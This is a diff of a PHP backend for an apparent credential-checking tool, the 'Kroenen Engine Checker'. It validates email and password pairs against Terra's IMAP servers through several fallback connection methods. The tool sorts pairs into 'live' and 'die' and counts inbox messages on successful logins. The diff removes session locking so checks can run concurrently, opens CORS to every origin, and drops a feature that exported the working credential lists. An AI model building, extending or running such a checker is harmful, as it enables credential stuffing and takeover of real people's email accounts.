@@ -1,20 +1,20 @@
 <?php
 /**
- * api.php — Backend do Kroenen Engine Checker
- * Corrigido: init retorna proxies[], check aceita FormData, download funcional
+ * api.php — Backend Kroenen Engine Checker
+ * Corrigido: SEM session_start() (removido bloqueio de concorrência)
  */
 error_reporting(0);
 ini_set('display_errors', '0');
-
-session_start();
+ini_set('session.use_cookies', '0');
 
 $action = $_GET['action'] ?? '';
 
 // ════════════════════════════════════════════════════════
-//  INIT — Frontend espera: { "status":"ok", "proxies":[] }
+//  INIT
 // ════════════════════════════════════════════════════════
 if ($action === 'init') {
     header('Content-Type: application/json; charset=utf-8');
+    header('Access-Control-Allow-Origin: *');
     echo json_encode([
         'status'  => 'ok',
         'proxies' => [],
@@ -23,15 +23,33 @@ if ($action === 'init') {
 }
 
 // ════════════════════════════════════════════════════════
-//  CHECK — Recebe FormData: email, password, proxy
-//  Retorna: { "status":"live"|"die", "email":"...", "reason":"..." }
+//  PING — teste rápido sem IMAP
+// ════════════════════════════════════════════════════════
+if ($action === 'ping') {
+    header('Content-Type: application/json; charset=utf-8');
+    echo json_encode([
+        'status' => 'ok',
+        'pong'   => true,
+        'time'   => date('Y-m-d H:i:s'),
+        'php'    => PHP_VERSION,
+        'exts'   => [
+            'curl'    => extension_loaded('curl'),
+            'openssl' => extension_loaded('openssl'),
+            'imap'    => extension_loaded('imap'),
+        ],
+    ]);
+    exit;
+}
+
+// ════════════════════════════════════════════════════════
+//  CHECK — Recebe FormData: email, password
 // ════════════════════════════════════════════════════════
 if ($action === 'check') {
     header('Content-Type: application/json; charset=utf-8');
+    header('Access-Control-Allow-Origin: *');
 
     $email    = $_POST['email']    ?? '';
     $password = $_POST['password'] ?? '';
-    // proxy é ignorado — usuário não quer usar proxy
 
     if ($email === '' || $password === '') {
         echo json_encode([
@@ -42,35 +60,12 @@ if ($action === 'check') {
         exit;
     }
 
-    $result = doValidate($email, $password);
-
-    // Armazena resultado na sessão para download
-    if (!isset($_SESSION['results'])) {
-        $_SESSION['results'] = ['live' => [], 'die' => []];
-    }
-    $key = ($result['status'] === 'live') ? 'live' : 'die';
-    $_SESSION['results'][$key][] = $email . ':' . $password;
-
-    echo json_encode($result);
+    echo json_encode(doValidate($email, $password));
     exit;
 }
 
 // ════════════════════════════════════════════════════════
-//  DOWNLOAD — Retorna .txt com lives ou dies
-// ════════════════════════════════════════════════════════
-if ($action === 'download') {
-    $type = $_GET['type'] ?? 'lives';
-    $key  = ($type === 'lives') ? 'live' : 'die';
-    $list = $_SESSION['results'][$key] ?? [];
-
-    header('Content-Type: text/plain; charset=utf-8');
-    header('Content-Disposition: attachment; filename="' . $type . '.txt"');
-    echo implode("\n", $list);
-    exit;
-}
-
-// ════════════════════════════════════════════════════════
-//  DEFAULT — Qualquer outra action retorna ok
+//  DEFAULT
 // ════════════════════════════════════════════════════════
 header('Content-Type: application/json; charset=utf-8');
 echo json_encode(['status' => 'ok']);
@@ -82,7 +77,7 @@ exit;
 
 function doValidate(string $email, string $password): array {
     $start   = microtime(true);
-    $timeout = 15;
+    $timeout = 12;
     $debug   = [];
 
     // ── Método 1: cURL imaps:// ──
@@ -153,7 +148,7 @@ function doValidate(string $email, string $password): array {
         $debug[] = "fsock(tcp:143): {$errno}/{$errstr}";
     }
 
-    // ── Método 6: Plain TCP porta 143 (sem SSL) ──
+    // ── Método 6: Plain TCP porta 143 ──
     $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $timeout);
     if ($socket !== false) {
         $debug[] = 'Plain143: conectado';
@@ -163,7 +158,7 @@ function doValidate(string $email, string $password): array {
         $debug[] = "fsock(plain:143): {$errno}/{$errstr}";
     }
 
-    // ── Método 7: imap_open (se disponível) ──
+    // ── Método 7: imap_open ──
     if (extension_loaded('imap')) {
         $mailbox = '{imap.terra.com.br:993/imap/ssl/novalidate-cert}';
         $conn = @imap_open($mailbox, $email, $password, OP_READONLY, 1, ['DISABLE_AUTHENTICATOR' => 'GSSAPI']);
@@ -194,7 +189,6 @@ function doValidate(string $email, string $password): array {
         }
     }
 
-    // Todos falharam
     return [
         'status'  => 'die',
         'email'   => $email,
@@ -205,7 +199,6 @@ function doValidate(string $email, string $password): array {
     ];
 }
 
-// ─── cURL ───
 function mCurl(string $email, string $password, int $timeout, float $start, array &$debug): ?array {
     $ch = curl_init();
     curl_setopt_array($ch, [
@@ -218,11 +211,11 @@ function mCurl(string $email, string $password, int $timeout, float $start, arra
         CURLOPT_TIMEOUT        => $timeout,
         CURLOPT_CONNECTTIMEOUT => $timeout,
         CURLOPT_NOSIGNAL       => 1,
-        CURLOPT_CUSTOMREQUEST  => 'STATUS INBOX (MESSAGES)',
     ]);
 
     $result = curl_exec($ch);
     $err    = curl_error($ch);
+    $code   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
 
     if ($result !== false) {
@@ -257,7 +250,6 @@ function mCurl(string $email, string $password, int $timeout, float $start, arra
     return null;
 }
 
-// ─── IMAP LOGIN sobre socket ───
 function imapLogin($socket, string $email, string $password, string $method, array &$debug, int $timeout, float $start, bool $read_greeting): ?array {
     stream_set_timeout($socket, $timeout);
 
@@ -276,7 +268,6 @@ function imapLogin($socket, string $email, string $password, string $method, arr
         $debug[] = "{$method}: greeting OK";
     }
 
-    // LOGIN
     $tag = 'L001';
     $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
     $safe_pass  = str_replace(['\', '"'], ['\\', '\"'], $password);
@@ -305,7 +296,6 @@ function imapLogin($socket, string $email, string $password, string $method, arr
 
     $qt = preg_quote($tag, '/');
 
-    // OK = sucesso
     if (preg_match('/' . $qt . '\s+OK/i', $response)) {
         $msgs = 0;
         @fwrite($socket, "S001 STATUS INBOX (MESSAGES)\r\n");
@@ -325,7 +315,6 @@ function imapLogin($socket, string $email, string $password, string $method, arr
         ];
     }
 
-    // NO = credenciais inválidas
     if (preg_match('/' . $qt . '\s+NO/i', $response)) {
         fclose($socket);
         $debug[] = "{$method}: credenciais inválidas";
@@ -338,7 +327,6 @@ function imapLogin($socket, string $email, string $password, string $method, arr
         ];
     }
 
-    // BAD
     if (preg_match('/' . $qt . '\s+BAD/i', $response)) {
         fclose($socket);
         $debug[] = "{$method}: BAD";
@@ -350,7 +338,6 @@ function imapLogin($socket, string $email, string $password, string $method, arr
     return null;
 }
 
-// ─── Ler até tagged response ───
 function readUntilTag($socket, string $tag, int $timeout): ?string {
     $buffer = '';
     $deadline = microtime(true) + $timeout;
